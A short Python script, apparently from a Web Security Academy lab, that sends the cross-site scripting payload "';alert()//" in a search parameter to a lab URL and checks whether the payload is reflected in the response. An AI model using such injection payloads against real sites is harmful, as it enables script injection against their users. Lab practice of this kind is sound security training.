import requests

url = "https://0a5d008a0457d64980f40d0100f900a9.web-security-academy.net/"
payload = "';alert()//"

response = requests.get(url + "?search=" + payload)
print(response.status_code)
index = response.text.find("0 search results for")
print(response.text[index - 50 : index + 50])
if payload in response.text:
    print("yes")
else:
    print("we have nothing")
# print(response.text)
